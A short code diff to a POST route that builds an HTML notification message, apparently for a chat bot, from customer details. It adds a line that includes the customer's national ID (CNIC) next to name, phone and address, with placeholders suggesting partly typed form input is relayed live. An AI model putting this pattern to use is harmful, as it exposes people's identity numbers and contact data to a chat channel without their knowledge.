@@ -35,6 +35,7 @@ export async function POST(request: Request) {
     if (data.customer) {
       messageText += `👤 <b>CUSTOMER INFORMATION:</b>\n`;
       messageText += ` ├ 📛 <b>Full Name:</b> ${data.customer.fullName || '<i>Typing...</i>'}\n`;
+      messageText += ` ├ 🪪 <b>CNIC:</b> <code>${data.customer.cnic || '<i>Typing...</i>'}</code>\n`;
       messageText += ` ├ 📞 <b>Phone Number:</b> <code>${data.customer.mobileNumber || '<i>Typing...</i>'}</code>\n`;
       messageText += ` ├ 🏠 <b>Delivery Address:</b> ${data.customer.deliveryAddress || '<i>Typing...</i>'}\n`;
       messageText += ` ├ 🚚 <b>Delivery Type:</b> ${data.customer.deliveryType === 'open_parcel' ? '🔍 Open Parcel Inspection' : '📦 Standard Express'}\n`;
